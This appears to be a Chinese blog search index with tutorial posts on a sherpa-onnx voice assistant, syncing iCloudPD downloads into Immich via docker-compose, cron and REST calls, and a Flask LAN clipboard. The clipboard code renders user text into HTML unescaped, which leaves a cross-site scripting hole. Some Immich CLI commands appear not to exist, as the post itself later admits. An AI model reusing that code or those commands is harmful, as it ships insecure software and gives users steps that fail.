s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(sr, samples) while keyword_spotter.is_ready(stream): keyword_spotter.decode_stream(stream) result = keyword_spotter.get_result(stream) if result: print(f\u0026#34;检测到唤醒词: {result}\u0026#34;) keyword_spotter.reset_stream(stream) return True # ------------------ 语音识别 ------------------ def speech_recognition(extractor, speaker_manager) -\u0026gt; Tuple[str, str]: recognizer = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=get_relative_path(\u0026#34;/root/test/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/test/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, sample_rate=16000, feature_dim=80, decoding_method=\u0026#34;greedy_search\u0026#34;, debug=False, ) vad_config = sherpa_onnx.VadModelConfig() vad_config.silero_vad.model = get_relative_path(\u0026#34;/root/test/silero_vad.onnx\u0026#34;) vad_config.silero_vad.min_silence_duration = 0.5 vad_config.silero_vad.min_speech_duration = 0.5 vad_config.sample_rate = 16000 vad = sherpa_onnx.VoiceActivityDetector(vad_config, buffer_size_in_seconds=100) window_size = vad_config.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * 16000) audio_buffer = [] with sd.InputStream(channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=16000) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) audio_buffer = np.concatenate([audio_buffer, samples]) while len(audio_buffer) \u0026gt; window_size: vad.accept_waveform(audio_buffer[:window_size]) audio_buffer = audio_buffer[window_size:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * 16000: vad.pop() continue # 声纹 stream = extractor.create_stream() stream.accept_waveform(16000, vad.front.samples) stream.input_finished() emb = np.array(extractor.compute(stream)) speaker = speaker_manager.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; # ASR asr_stream = recognizer.create_stream() asr_stream.accept_waveform(16000, vad.front.samples) recognizer.decode_stream(asr_stream) text = asr_stream.result.text.strip() vad.pop() return text, speaker # ------------------ TTS ------------------ buffer = queue.Queue() started = False stopped = False killed = False event = threading.Event() tts_sr = 24000 # TTS 实际采样率 def generated_audio_callback(samples: np.ndarray, progress: float) -\u0026gt; int: global started buffer.put(samples) if not started: started = True return 0 if killed else 1 def play_audio_callback(outdata: np.ndarray, frames: int, time, status): if killed or (started and buffer.empty() and stopped): event.set() if buffer.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not buffer.empty(): remaining = frames - n k = buffer.queue[0].shape[0] if remaining \u0026lt;= k: outdata[n:, 0] = buffer.queue[0][:remaining] buffer.queue[0] = buffer.queue[0][remaining:] n = frames if buffer.queue[0].shape[0] == 0: buffer.get() break outdata[n:n+k, 0] = buffer.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def tts_synthesis(text: str): global tts_sr, started, stopped tts_config = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=get_relative_path(\u0026#34;/root/test/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=get_relative_path(\u0026#34;/root/test/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=get_relative_path(\u0026#34;/root/test/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;), ), provider=\u0026#34;cpu\u0026#34;, debug=False, num_threads=1, ), max_num_sentences=1, ) tts = sherpa_onnx.OfflineTts(tts_config) tts_sr = tts.sample_rate threading.Thread(target=lambda: sd.OutputStream( channels=1, callback=play_audio_callback, dtype=\u0026#34;float32\u0026#34;, samplerate=tts_sr, blocksize=1024 ).start()).start() event.clear() started = False stopped = False tts.generate(text, sid=0, speed=1.0, callback=generated_audio_callback) stopped = True event.wait() # ------------------ 主流程 ------------------ def main(): try: print(\u0026#34;初始化声纹识别...\u0026#34;) extractor, speaker_manager = init_speaker_identification() if wake_word_detection(): text, speaker = speech_recognition(extractor, speaker_manager) print(f\u0026#34;识别结果: {text} (说话人: {speaker})\u0026#34;) keyword, kid = fuzzy_match(text) if keyword: reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; else: reply = qwen_chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts_synthesis(reply) except KeyboardInterrupt: global killed killed = True print(\u0026#34;\\n程序已终止\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() 运行结果\n初始化声纹识别... /project/sherpa-onnx/csrc/features.cc:AcceptWaveformImpl:104 Creating a resampler: in_sample_rate: 44100 output_sample_rate: 16000 等待唤醒词... 检测到唤醒词: 小德小德 请说出您的指令... 识别结果: 一加一等于几 (说话人: unknown) Setting `pad_token_id` to `eos_token_id`:151643 for open-end generation. 回复: 您好！是 2。 初始化声纹识别... /project/sherpa-onnx/csrc/features.cc:AcceptWaveformImpl:104 Creating a resampler: in_sample_rate: 44100 output_sample_rate: 16000 等待唤醒词... 检测到唤醒词: 小德小德 请说出您的指令... 识别结果: 客厅灯 (说话人: ll) 回复: 已为您操作【客厅灯】，编号5 model err 改成在线下载\nchat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=\u0026#34;/root/test/models\u0026#34;, torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34; ) 采样率设配 #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; 唤醒词 + ASR + 声纹 + 拼音关键词 + Qwen2.5-0.5B 强制 48 kHz 解决 ALSA Invalid sample rate \u0026#34;\u0026#34;\u0026#34; import sys, os, threading, queue from pathlib import Path from typing import Tuple import numpy as np import sounddevice as sd import soundfile as sf import sherpa_onnx import torch from transformers import AutoTokenizer, AutoModelForCausalLM from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz BASE = Path(__file__).resolve().parent.parent def rel(p): return str(BASE / p) # ---------- 关键词 ---------- KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} def fuzzy_match(text: str) -\u0026gt; Tuple[str, int]: txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return \u0026#34;\u0026#34;, 0 # ---------- LLM ---------- tok = AutoTokenizer.from_pretrained(rel(\u0026#34;/root/room/models/qwen2.5-0.5b\u0026#34;), trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( \u0026#34;Qwen/Qwen2.5-0.5B\u0026#34;, cache_dir=rel(\u0026#34;/root/room/models\u0026#34;), torch_dtype=\u0026#34;auto\u0026#34;, device_map=\u0026#34;auto\u0026#34;) def chat(prompt: str) -\u0026gt; str: msgs = [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt}] txt = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) ipt = tok(txt, return_tensors=\u0026#34;pt\u0026#34;) with torch.no_grad(): out = chat_model.generate(**ipt, max_new_tokens=64, do_sample=True, temperature=0.7) return tok.decode(out[0][len(ipt.input_ids[0]):], skip_special_tokens=True).strip() # ---------- 声纹 ---------- def init_spk(): ext = sherpa_onnx.SpeakerEmbeddingExtractor( sherpa_onnx.SpeakerEmbeddingExtractorConfig( model=rel(\u0026#34;/root/room/wespeaker_zh_cnceleb_resnet34.onnx\u0026#34;), num_threads=1, provider=\u0026#34;cpu\u0026#34;)) mgr = sherpa_onnx.SpeakerEmbeddingManager(ext.dim) with open(rel(\u0026#34;/root/room/speaker.txt\u0026#34;)) as f: for line in f: name, wav = line.strip().split() samples, sr = sf.read(rel(wav), always_2d=True, dtype=\u0026#34;float32\u0026#34;) samples = samples[:, 0] s = ext.create_stream() s.accept_waveform(sr, samples) s.input_finished() emb = np.array(ext.compute(s)) mgr.add(name, emb) return ext, mgr # ---------- 设备 ---------- def choose_device(kind: str) -\u0026gt; int: devs = sd.query_devices() print(f\u0026#34;\\n=== 可用 {kind} 设备 ===\u0026#34;) for idx, d in enumerate(devs): if (kind == \u0026#34;input\u0026#34; and d[\u0026#34;max_input_channels\u0026#34;] \u0026gt; 0) or \\ (kind == \u0026#34;output\u0026#34; and d[\u0026#34;max_output_channels\u0026#34;] \u0026gt; 0): print(f\u0026#34;{idx}: {d[\u0026#39;name\u0026#39;]}\u0026#34;) idx = int(input(f\u0026#34;请选择 {kind} 设备编号: \u0026#34;)) return idx # ---------- 统一采样率 ---------- SR = 48000 # Linux USB 声卡常见支持值 # ---------- 唤醒词 ---------- def kws_loop(dev: int) -\u0026gt; bool: kws_dir = rel(\u0026#34;/root/room/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01\u0026#34;) kws = sherpa_onnx.KeywordSpotter( tokens=f\u0026#34;{kws_dir}/tokens.txt\u0026#34;, encoder=f\u0026#34;{kws_dir}/encoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;, decoder=f\u0026#34;{kws_dir}/decoder-epoch-12-avg-2-chunk-16-left-64.int8.onnx\u0026#34;, joiner=f\u0026#34;{kws_dir}/joiner-epoch-99-avg-1-chunk-16-left-64.int8.onnx\u0026#34;, num_threads=1, provider=\u0026#34;cpu\u0026#34;, keywords_file=f\u0026#34;{kws_dir}/keywords.txt\u0026#34;, keywords_score=1.0, keywords_threshold=0.25) print(\u0026#34;等待唤醒词...\u0026#34;) stream = kws.create_stream() chunk = int(0.1 * SR) with sd.InputStream(device=dev, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=SR) as s: while True: samples, _ = s.read(chunk) samples = samples.reshape(-1) stream.accept_waveform(SR, samples) while kws.is_ready(stream): kws.decode_stream(stream) if kws.get_result(stream): kws.reset_stream(stream) return True # ---------- ASR ---------- def asr_loop(dev: int, ext, mgr) -\u0026gt; Tuple[str, str]: rec = sherpa_onnx.OfflineRecognizer.from_paraformer( paraformer=rel(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/model.int8.onnx\u0026#34;), tokens=rel(\u0026#34;/root/room/sherpa-onnx-paraformer-zh-2023-03-28/tokens.txt\u0026#34;), num_threads=1, provider=\u0026#34;cpu\u0026#34;, decoding_method=\u0026#34;greedy_search\u0026#34;) vad_cfg = sherpa_onnx.VadModelConfig() vad_cfg.silero_vad.model = rel(\u0026#34;/root/room/silero_vad.onnx\u0026#34;) vad_cfg.silero_vad.min_silence_duration = 0.5 vad_cfg.silero_vad.min_speech_duration = 0.5 vad = sherpa_onnx.VoiceActivityDetector(vad_cfg, buffer_size_in_seconds=100) win = vad_cfg.silero_vad.window_size print(\u0026#34;请说出您的指令...\u0026#34;) chunk = int(0.1 * SR) buf = [] with sd.InputStream(device=dev, channels=1, dtype=\u0026#34;float32\u0026#34;, samplerate=SR) as s: while True: samples, _ = s.read(chunk) buf = np.concatenate([buf, samples]) while len(buf) \u0026gt; win: vad.accept_waveform(buf[:win]) buf = buf[win:] while not vad.empty(): if len(vad.front.samples) \u0026lt; 0.5 * SR: vad.pop() continue # 声纹 st = ext.create_stream() st.accept_waveform(SR, vad.front.samples) st.input_finished() emb = np.array(ext.compute(st)) spk = mgr.search(emb, threshold=0.6) or \u0026#34;unknown\u0026#34; # ASR ast = rec.create_stream() ast.accept_waveform(SR, vad.front.samples) rec.decode_stream(ast) vad.pop() return ast.result.text.strip(), spk # ---------- TTS ---------- q = queue.Queue() started = stopped = killed = False evt = threading.Event() def gen_cb(samples: np.ndarray, progress: float) -\u0026gt; int: global started q.put(samples) started = True return 0 if killed else 1 def play_cb(outdata: np.ndarray, frames: int, time, status): if killed or (started and q.empty() and stopped): evt.set() if q.empty(): outdata.fill(0) return n = 0 while n \u0026lt; frames and not q.empty(): rem = frames - n k = q.queue[0].shape[0] if rem \u0026lt;= k: outdata[n:, 0] = q.queue[0][:rem] q.queue[0] = q.queue[0][rem:] n = frames if q.queue[0].shape[0] == 0: q.get() break outdata[n:n+k, 0] = q.get() n += k if n \u0026lt; frames: outdata[n:, 0] = 0 def tts(text: str, dev: int): cfg = sherpa_onnx.OfflineTtsConfig( model=sherpa_onnx.OfflineTtsModelConfig( vits=sherpa_onnx.OfflineTtsVitsModelConfig( model=rel(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/zh_CN-huayan-medium.onnx\u0026#34;), tokens=rel(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/tokens.txt\u0026#34;), data_dir=rel(\u0026#34;/root/room/vits-piper-zh_CN-huayan-medium/espeak-ng-data\u0026#34;)), provider=\u0026#34;cpu\u0026#34;, num_threads=1), max_num_sentences=1) tts = sherpa_onnx.OfflineTts(cfg) threading.Thread(target=lambda: sd.OutputStream( device=dev, channels=1, callback=play_cb, dtype=\u0026#34;float32\u0026#34;, samplerate=SR, blocksize=1024).start()).start() global started, stopped started = stopped = False evt.clear() tts.generate(text, sid=0, speed=1.0, callback=gen_cb) stopped = True evt.wait() # ---------- main ---------- def main(): try: mic = choose_device(\u0026#34;input\u0026#34;) spk = choose_device(\u0026#34;output\u0026#34;) ext, mgr = init_spk() if kws_loop(mic): text, speaker = asr_loop(mic, ext, mgr) print(f\u0026#34;识别: {text} (说话人: {speaker})\u0026#34;) keyword, kid = fuzzy_match(text) reply = f\u0026#34;已为您操作【{keyword}】，编号{kid}\u0026#34; if keyword else chat(text) print(\u0026#34;回复:\u0026#34;, reply) tts(reply, spk) except KeyboardInterrupt: global killed killed = True print(\u0026#34;\\n程序已终止\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() End\n","permalink":"https://qfsyso.github.io/posts/speech-to-text-and-vad/","summary":"Sherpa-onnx 提供一个灵活、易用且高性能的语音处理解决方案 项目地址 https://github.com/k2-fsa/sherpa-onnx\nsherpa-onnx 创建虚拟环境 test\u0026gt;python -m venv my-test .\\my-test\\Script\\activate pip install sherpa-onnx set path= D:\\wk2\\asr\\SpeechProcessing\\test\\my-test\\bin;%path% sherpa-onnx # 下载模型 https://k2-fsa.github.io/sherpa/onnx/pretrained_models/online-transducer/zipformer-transducer-models.html bilingual-zh-en-2023-02-20 a.bat # linux sherpa-onnx \\ --tokens=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt \\ --encoder=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx \\ --decoder=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx \\ --joiner=./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx \\ ./sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/test_wavs/1.wav # win sherpa-onnx ^ --tokens=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt ^ --encoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/encoder-epoch-99-avg-1.onnx ^ --decoder=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/decoder-epoch-99-avg-1.onnx ^ --joiner=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/joiner-epoch-99-avg-1.onnx ^ .\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/test_wavs/1.wav win需要执行\nchcp 65001 运行测试\n\u0026gt;.\\a.bat 下载 sherpa-onnx\ngit clone https://github.com/k2-fsa/sherpa-onnx 测试sherpa-onnx\\python-api-examples\\speech-recognition-from-microphone-with-endpoint-detection.py\n安装依赖 pip install sounddevice numpy python .\\sherpa-onnx\\python-api-examples\\speech-recognition-from-microphone-with-endpoint-detection.py ^ --tokens=.\\sherpa-onnx-streaming-zipformer-bilingual-zh-en-2023-02-20/tokens.txt ^ --encoder=.","title":"Speech-to-text and VAD "},{"content":"把 iCloudPD 下载目录 /data/icloudpd/download ， 以 只读 方式挂到 immich-server 的 /usr/src/app/external（外部库专用路径）， 保留了官方上传目录 UPLOAD_LOCATION（内部库）不变， 修正了原文件缩进错误（volumes 多缩一格）并添加 external 卷， 其余 redis、postgres、machine-learning 服务保持官方默认配置。\n将下列内容整体覆盖原文件即可。\nname: immich services: immich-server: container_name: immich_server image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release} volumes: - ${UPLOAD_LOCATION}:/usr/src/app/upload # 内部库（用户上传） - /data/icloudpd/download:/usr/src/app/external:ro # 外部库（icloudpd 下载） - /etc/localtime:/etc/localtime:ro env_file: - .env ports: - \u0026#39;2283:2283\u0026#39; depends_on: - redis - database restart: always healthcheck: disable: false immich-machine-learning: container_name: immich_machine_learning image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release} volumes: - model-cache:/cache env_file: - .env restart: always healthcheck: disable: false redis: container_name: immich_redis image: docker.io/valkey/valkey:8-bookworm@sha256:facc1d2c3462975c34e10fccb167bfa92b0e0dbd992fc282c29a61c3243afb11 healthcheck: test: redis-cli ping || exit 1 restart: always database: container_name: immich_postgres image: ghcr.io/immich-app/postgres:14-vectorchord0.4.3-pgvectors0.2.0@sha256:5f6a838e4e44c8e0e019d0ebfe3ee8952b69afc2809b2c25f7b0119641978e91 environment: POSTGRES_PASSWORD: ${DB_PASSWORD} POSTGRES_USER: ${DB_USERNAME} POSTGRES_DB: ${DB_DATABASE_NAME} POSTGRES_INITDB_ARGS: \u0026#39;--data-checksums\u0026#39; volumes: - pgdata:/var/lib/postgresql/data shm_size: 128mb restart: always volumes: model-cache: pgdata: 使用步骤： 把文件保存为 docker-compose.yml； 确认 .env 中 UPLOAD_LOCATION 仍指向内部库（如 /data/immich/upload）； docker compose up -d 重启； 浏览器进 Immich → 管理员设置 → 外部库 → Add External Library → Path 填 /usr/src/app/external → 保存 → Scan， 即可看到 icloudpd 下载的照片/视频。\n文件元数据缺失导致记录被过滤 部分 HEIC/视频文件若元数据提取失败，fileCreatedAt 会为空，Immich 会把这些记录隐藏，看起来就像没扫描到 。 排查 / 修复：\n# 进入数据库查空时间戳 docker exec -i immich_postgres psql -U postgres -d immich \\ -c \u0026#34;select count(*) from assets where \\\u0026#34;fileCreatedAt\\\u0026#34; is null;\u0026#34; # 如果确实有，删掉脏数据后重新跑一次全扫描 docker exec -i immich_postgres psql -U postgres -d immich \\ -c \u0026#34;delete from assets where \\\u0026#34;fileCreatedAt\\\u0026#34; is null;\u0026#34; 然后 Admin → Jobs → 扫描所有库 重新触发。\n一键排错脚本 #!/bin/bash set -e echo \u0026#34;1. 检查外部库是否已添加...\u0026#34; docker exec immich_server ls -l /usr/src/app/external || echo \u0026#34;❌ 未挂载外部库\u0026#34; echo \u0026#34;2. 检查权限...\u0026#34; docker exec immich_server su - node -c \u0026#34;ls -l /usr/src/app/external | head -3\u0026#34; echo \u0026#34;3. 检查空时间戳...\u0026#34; docker exec -i immich_postgres psql -U postgres -d immich \\ -c \u0026#34;select count(*) from assets where \\\u0026#34;fileCreatedAt\\\u0026#34; is null;\u0026#34; 若 1、2 都正常，且 3 返回 0，仍扫描不到，请把 /data/icloudpd/download 里随便一张图复制到 /tmp/test.jpg， 然后 docker exec immich_server immich-cli upload /tmp/test.jpg 看是否能上传成功，排除文件格式问题。\n定时扫描 方案 A：Linux 宿主机 crontab（最稳，1 行命令）\n# 每天凌晨 3:30 触发一次全量增量扫描 30 3 * * * docker exec immich_server immich-api libraries/scan-all --json \u0026gt; /dev/null 30 3 * * * docker exec immich_server immich-cli refresh-files --all （immich-cli 需容器内已装，官方镜像已自带）\n方案 B：用 Watchtower / ofelia 当「容器内调度器」 在 compose 里加一个 ofelia 容器：\nofelia: image: mcuadros/ofelia:latest volumes: - /var/run/docker.sock:/var/run/docker.sock:ro command: | [schedules.scan] schedule = \u0026#34;0 30 3 * * *\u0026#34; # 每天 03:30 container = \u0026#34;immich_server\u0026#34; command = \u0026#34;immich-api libraries/scan-all\u0026#34; docker compose up -d 即可生效，无需动宿主机 crontab。 把 crontab 改成每天 16:00（下午 4 点） 触发即可：\n# 每天下午 4:00 触发一次外部库扫描 0 16 * * * docker exec immich_server immich-api libraries/scan-all --json \u0026gt; /dev/null 直接编辑当前用户的 crontab： crontab -e → 粘贴上面一行 → 保存退出。 以 root 身份编辑： sudo crontab -e → 同上。 立即生效，无需重启任何容器。\n使用api扫描 使用官方自带的「Node 入口」调用 API（通用办法）, Immich 镜像里 一定 有 Node，我们可以直接跑 Node 脚本来触发扫描。 最简单的做法：用 curl 调 REST 接口。 先准备 3 个信息（一次搞定）： API Key, 外部库 ID, 服务器 URL（本机就是 http://localhost:2283）\nA. 创建 API Key 浏览器登录 Immich → 右上角头像 → Account Settings → API Keys → Create , 名字随便填，权限给 Admin，生成后复制保存。\nB. 列出外部库并记下 ID curl -s -H \u0026#34;x-api-key: \u0026lt;APIKey\u0026gt;\u0026#34; http://localhost:2283/api/libraries | jq 会看到类似\n[ { \u0026#34;id\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;external\u0026#34;, ... } ] 把 \u0026ldquo;id\u0026rdquo; 字段复制出来（下面用 \u0026lt;LIBRARY_ID\u0026gt; 代替）。\nStep 3 手动测试一次扫描 curl -X POST \\ -H \u0026#34;x-api-key: \u0026lt;APIKey\u0026gt;\u0026#34; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;refreshModifiedFiles\u0026#34;:true,\u0026#34;refreshAllFiles\u0026#34;:false}\u0026#39; \\ http://localhost:2283/api/libraries/\u0026lt;LIBRARY_ID\u0026gt;/scan 返回 {\u0026ldquo;id\u0026rdquo;:\u0026quot;\u0026hellip;\u0026quot;,\u0026ldquo;status\u0026rdquo;:\u0026ldquo;queued\u0026rdquo;} 就说明成功。\nStep 4 写 crontab 把上面 curl 命令塞进定时任务，每天下午 4 点：\ncrontab -e 粘贴（整行，注意替换两处占位符）：\n0 16 * * * curl -s -X POST -H \u0026#34;x-api-key:\u0026lt;APIKey\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;refreshModifiedFiles\u0026#34;:true,\u0026#34;refreshAllFiles\u0026#34;:false}\u0026#39; http://localhost:2283/api/libraries/\u0026lt;LIBRARY_ID\u0026gt;/scan \u0026gt; /dev/null 保存退出即可。 可以用\nsudo systemctl status cron 确认 cron 服务正在运行。\nStep 5 立即验证 手动触发一次：\ncurl -X POST ... # 同上 然后去 Immich Web → Jobs → Library，应能看到新任务出现。\ncurl -s -H \u0026#34;x-api-key:\u0026lt;KEY\u0026gt;\u0026#34; http://localhost:2283/api/libraries | grep \u0026#39;\u0026#34;id\u0026#34;\u0026#39; | head -1 照样能抄到 ID。 这样就彻底绕过缺失的 immich-cli，用 REST API 完成定时扫描。\ncurl -s -H \u0026#34;x-api-key:UFepeHfb2xxx\u0026#34; http://localhost:2283/api/libraries | jq curl -X POST \\ -H \u0026#34;x-api-key:UFepeHfb2xxx\u0026#34; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;refreshModifiedFiles\u0026#34;:true,\u0026#34;refreshAllFiles\u0026#34;:false}\u0026#39; \\ http://localhost:2283/api/libraries/d3e68058-fdf9-xx/scan 0 16 * * * curl -s -X POST -H \u0026#34;x-api-key:UFepeHfb2xxx\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;refreshModifiedFiles\u0026#34;:true,\u0026#34;refreshAllFiles\u0026#34;:false}\u0026#39; http://localhost:2283/api/libraries/d3e68058-fxxa/scan \u0026gt; /dev/null 保存退出即可。\n","permalink":"https://qfsyso.github.io/posts/icloudpd-sync-immich/","summary":"把 iCloudPD 下载目录 /data/icloudpd/download ， 以 只读 方式挂到 immich-server 的 /usr/src/app/external（外部库专用路径）， 保留了官方上传目录 UPLOAD_LOCATION（内部库）不变， 修正了原文件缩进错误（volumes 多缩一格）并添加 external 卷， 其余 redis、postgres、machine-learning 服务保持官方默认配置。\n将下列内容整体覆盖原文件即可。\nname: immich services: immich-server: container_name: immich_server image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release} volumes: - ${UPLOAD_LOCATION}:/usr/src/app/upload # 内部库（用户上传） - /data/icloudpd/download:/usr/src/app/external:ro # 外部库（icloudpd 下载） - /etc/localtime:/etc/localtime:ro env_file: - .env ports: - \u0026#39;2283:2283\u0026#39; depends_on: - redis - database restart: always healthcheck: disable: false immich-machine-learning: container_name: immich_machine_learning image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release} volumes: - model-cache:/cache env_file: - .env restart: always healthcheck: disable: false redis: container_name: immich_redis image: docker.","title":"iCloudPD sync Immich"},{"content":"共享粘贴板 可以在一个设备输入文字，生成一个链接，其他设备在同一局域网内用链接访问可获取文字\n用 Python (Flask) + 对称加密 (Fernet) 来实现\n📂 项目结构 lan-clipboard/\n├── app.py\n├── requirements.txt\n└── Dockerfile\nrequirements.txt flask cryptography app.py from flask import Flask, request, redirect, url_for, render_template_string, abort from cryptography.fernet import Fernet import os app = Flask(__name__) # 生成或从环境变量读取密钥 FERNET_KEY = os.environ.get(\u0026#34;FERNET_KEY\u0026#34;) or Fernet.generate_key().decode() fernet = Fernet(FERNET_KEY.encode()) # 简单内存存储 (可替换为文件或数据库) storage = {} # 简单页面模板 FORM_HTML = \u0026#34;\u0026#34;\u0026#34; \u0026lt;!doctype html\u0026gt; \u0026lt;title\u0026gt;LAN Clipboard\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;LAN Clipboard\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/share\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;textarea name=\u0026#34;text\u0026#34; rows=\u0026#34;10\u0026#34; cols=\u0026#34;50\u0026#34; placeholder=\u0026#34;输入文字...\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;生成分享链接\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return FORM_HTML @app.route(\u0026#34;/share\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def share(): text = request.form.get(\u0026#34;text\u0026#34;) if not text: return \u0026#34;内容不能为空\u0026#34;, 400 # 加密 token = fernet.encrypt(text.encode()).decode() # 存储 (用 token 的 hash 做 key) storage[token] = text link = url_for(\u0026#34;get_text\u0026#34;, token=token, _external=True) return f\u0026#34;\u0026lt;p\u0026gt;分享链接：\u0026lt;a href=\u0026#39;{link}\u0026#39;\u0026gt;{link}\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#34; @app.route(\u0026#34;/get/\u0026lt;token\u0026gt;\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def get_text(token): try: # 解密验证 text = fernet.decrypt(token.encode()).decode() except: abort(400, \u0026#34;无效或过期链接\u0026#34;) return f\u0026#34;\u0026lt;h1\u0026gt;内容：\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;{text}\u0026lt;/pre\u0026gt;\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: print(f\u0026#34;使用密钥：{FERNET_KEY} （用于加密解密，可设置为环境变量 FERNET_KEY）\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) Dockerfile # 使用 Python 官方基础镜像 FROM python:3.11-slim # 设置工作目录 WORKDIR /app # 拷贝文件 COPY requirements.txt ./ COPY app.py ./ # 安装依赖 RUN pip install -r requirements.txt # 暴露端口 EXPOSE 5000 # 启动服务 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 使用 构建镜像 在 lan-clipboard 文件夹下执行：\ndocker build -t lan-clipboard . 运行容器 运行并让它监听局域网：\ndocker run -d -p 5000:5000 --name clipboard lan-clipboard 使用方法 在浏览器访问 http://IP\u0026gt;:5000， 输入文字，点击生成， 复制分享的链接， 在局域网其他设备用浏览器打开链接即可查看\n可选：自定义密钥 为了让生成的链接跨容器/多次重启可用，可以自己指定密钥：\ndocker run -d -p 5000:5000 -e FERNET_KEY=\u0026#34;你的自定义密钥\u0026#34; lan-clipboard 加密说明\n使用对称加密 Fernet，保证内容在 URL 中加密，不可读。\n文件 / 持久化 输入文字、上传文件， 生成加密链接， 支持自定义过期时间（分钟），SQLite 持久化，多条记录， 文件保存到 uploads/，加密下载\nimport os import uuid import hashlib from datetime import datetime, timedelta from flask import Flask, request, redirect, url_for, send_from_directory, abort, render_template_string from flask_sqlalchemy import SQLAlchemy app = Flask(__name__) # ======================= # 配置 # ======================= BASE_DIR = os.path.abspath(os.path.dirname(__file__)) UPLOAD_FOLDER = os.path.join(BASE_DIR, \u0026#39;uploads\u0026#39;) os.makedirs(UPLOAD_FOLDER, exist_ok=True) DATA_FOLDER = os.path.join(BASE_DIR, \u0026#39;data\u0026#39;) os.makedirs(DATA_FOLDER, exist_ok=True) DATABASE_FILE = os.path.join(DATA_FOLDER, \u0026#39;app.db\u0026#39;) app.config[\u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;] = \u0026#39;sqlite:///\u0026#39; + DATABASE_FILE 